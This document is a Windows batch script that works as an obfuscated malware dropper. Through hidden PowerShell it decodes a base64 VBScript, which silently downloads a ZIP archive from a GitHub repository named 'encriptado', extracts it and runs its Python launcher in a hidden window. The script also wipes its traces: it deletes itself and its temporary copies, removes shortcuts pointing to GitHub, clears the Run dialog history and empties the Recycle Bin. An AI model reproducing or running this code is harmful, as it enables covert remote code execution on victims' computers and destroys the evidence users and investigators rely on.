@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNClNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQoNClNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lDQpTY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShTY3JpcHRQYXRoKQ0KVGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpDQoNClJlcG9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCINCnppcFBhdGggPSBTY3JpcHREaXIgJiAiXHJlcG8uemlwIg0KZXh0cmFjdFBhdGggPSBTY3JpcHREaXIgJiAiXGV4dHJhY3RlZCINCg0KcHNEb3dubG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXw0KIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7ICIgJiBfDQoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8NCiJ0cnkgeyAiICYgXw0KIiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICciICYgUmVwb1VSTCAmICInIC1PdXRGaWxlICciICYgemlwUGF0aCAmICInIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwOyAiICYgXw0KIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8NCiJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8NCkNocigzNCkNCg0Kc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUNCldzY3JpcHQuU2xlZXAgODAwMA0KDQpJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbg0KICAgIFdzY3JpcHQuUXVpdA0KRW5kIElmDQoNCldTY3JpcHQuU2xlZXAgMjAwMA0KDQpyZXBvUGF0aCA9ICIiDQpsYXVuY2hlclBhdGggPSAiIg0KcHl0aG9uUGF0aCA9ICIiDQoNCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4NCiAgICBGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycw0KICAgICAgICBJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuDQogICAgICAgICAgICByZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoDQogICAgICAgICAgICBsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiDQogICAgICAgICAgICBweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIg0KICAgICAgICAgICAgRXhpdCBGb3INCiAgICAgICAgRW5kIElmDQogICAgTmV4dA0KRW5kIElmDQoNCklmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuDQogICAgc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoDQogICAgY21kTGF1bmNoID0gQ2hyKDM0KSAmIHB5dGhvblBhdGggJiBDaHIoMzQpICYgIiAiICYgQ2hyKDM0KSAmIGxhdW5jaGVyUGF0aCAmIENocigzNCkNCiAgICBzaGVsbC5SdW4gY21kTGF1bmNoLCAwLCBGYWxzZQ0KICAgIFdTY3JpcHQuU2xlZXAgMTAwMDANCkVuZCBJZg0KDQpJZiBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuDQogICAgZnNvLkRlbGV0ZUZpbGUgemlwUGF0aCwgVHJ1ZQ0KRW5kIElmDQoNCldTY3JpcHQuU2xlZXAgMjAwMA0KZnNvLkRlbGV0ZUZpbGUgU2NyaXB0UGF0aCwgVHJ1ZQ0KV1NjcmlwdC5RdWl0'; ^
[IO.File]::WriteAllBytes('%vbsfile%', [Convert]::FromBase64String($b64)); ^
Start-Process wscript.exe -ArgumentList '%vbsfile%','/B','/Nologo' -WindowStyle Hidden; ^
Start-Sleep 2; ^
$lnks = Get-ChildItem -Path $env:USERPROFILE -Filter '*.lnk' -Recurse -EA SilentlyContinue ^| Where-Object {$_.Length -lt 5000}; ^
foreach($lnk in $lnks){try{$ws=New-Object -COM WScript.Shell;$sc=$ws.CreateShortcut($lnk.FullName);if($sc.Arguments -match 'github'){Remove-Item $lnk.FullName -Force -EA SilentlyContinue}}catch{}}; ^
Remove-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Recurse -Force -EA SilentlyContinue; ^
Clear-RecycleBin -Force -Confirm:$false -EA SilentlyContinue"

timeout /t 2 /nobreak >nul

del /f /q "%~f0" >nul 2>&1
exit